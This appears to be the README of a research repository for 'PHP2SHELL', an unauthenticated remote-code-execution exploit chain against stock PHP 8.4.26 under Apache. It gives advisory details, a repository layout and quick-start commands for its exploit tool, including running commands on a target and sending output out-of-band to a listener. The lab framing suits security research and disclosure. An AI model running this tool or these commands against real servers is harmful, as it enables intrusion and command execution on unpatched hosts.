# PHP2SHELL — engine-level RCE on PHP 8.4.26 mod_php

Research lab and interactive exploit for **CVE-2026-109618 / CVE-2026-109619**
on the stock `php:8.4.26-apache` image. The chain is engine-level: it drives
the session upload-progress callback before RINIT and reaches `zif_system`
through a forged `zend_reference` / `zend_array` destructor. No application
PHP and no authentication are required.

**Status:** working on the local Docker lab. Single-worker execution, a
bounded four-worker prefork pool, out-of-band command output (`--oob`), and
TLS through a raw TCP-level terminator (`--https`) are validated. The full
findings, evidence, and limitations are in [`REPORT.md`](REPORT.md).

**Primary deliverable:** [`official-lab/pure_shell.py`](official-lab/pure_shell.py).

## Advisory boundary

PHP fixed both CVEs in **8.2.35, 8.3.36, 8.4.27, and 8.5.12**. The CVE
records give the affected branches as `8.2.* < 8.2.35`,
`8.3.* < 8.3.36`, `8.4.* < 8.4.27`, and `8.5.* < 8.5.12`. The target in
this repo, 8.4.26, is the **last vulnerable 8.4 release**; 8.4.27 is the
**first fixed release**. The lab proves that point, not the full advisory
range. Patched releases are boundary controls, not targets; the repo does
not yet contain full patched-image negative controls.

Sources: [PHP advisory](https://www.php.net/archive/2026.php#2026-10-21-5),
[GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w),
[GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp),
[CVE-2026-109618](https://www.cve.org/CVERecord?id=CVE-2026-109618),
[CVE-2026-109619](https://www.cve.org/CVERecord?id=CVE-2026-109619).

## Layout

| Path | Contents |
|---|---|
| `official-lab/` | Stock 8.4.26 target, interactive tool, A1/B1/A2/B2 chain, multi-worker/TLS/OOB modes, evidence |
| `modphp-lab/` | 8.3.33 mod_php supporting port (application precondition) |
| `fpm-lab/` | 8.3.35 FPM supporting port (application precondition) |
| `REPORT.md` | Consolidated report: findings, chain, evidence manifest, limits |

The stock-target claim is the `official-lab/` result. The 8.3.33 and 8.3.35
ports are reported separately because each needs an application-side sink
(`unserialize` or a session-write endpoint); they are not part of the
stock-8.4.26 claim.

## Quick start

From the repository root:

```bash
cd official-lab
./run.sh
python3 pure_shell.py --exec 'id'
```

Other validated paths:

```bash
# runtime address resolution only
python3 pure_shell.py --leak

# bounded four-worker pool
./run_multi.sh
python3 pure_shell.py --port 18112 --multi --outdir multi-out --exec 'id'

# out-of-band output
./experiments/run_oob_listener.sh
python3 pure_shell.py --oob 'http://<listener-ip>:18999/' --exec 'id'

# TLS through a raw TCP-level terminator
python3 experiments/tls_tcp_forward.py \
  --cert docker/tls/cert.pem --key docker/tls/key.pem \
  --port 18444 --target-port 18110 &
python3 pure_shell.py --port 18444 --https --insecure \
  --oob 'http://<listener-ip>:18999/' --exec 'id'
```

The complete command reference, target profile, offsets, and evidence map are
in [`official-lab/README.md`](official-lab/README.md),
[`official-lab/CALIBRATION.md`](official-lab/CALIBRATION.md), and
[`official-lab/EVIDENCE.md`](official-lab/EVIDENCE.md).

## Scope

- All runs in this repository are against local Docker targets. The repo
  ships no live-target list and no live-target automation.
- The working workspace's third-party clones (`exploits/`, `repos/`), live
  probe tooling (`tools/`), CMS target lists, and the 8.0.30 calibration
  scratch notes are intentionally excluded. This repository contains the
  PHP2SHELL lab code, docs, and evidence.
- The 9bie reference clone is external. Two reference-reproduction commands
  in `CALIBRATION.md` and `EVIDENCE.md` point at `../exploits/9bie-latest`;
  the core tool and all stock-target runs do not need it.
- Test TLS key material is not committed. `official-lab/README.md` regenerates
  it with `openssl`.

## Credits

- 9bie's public PHP2SHELL ASLR research and reference exploit.
- `de0`'s payload generators vendored under `official-lab/payloads/` and
  attributed in their headers.
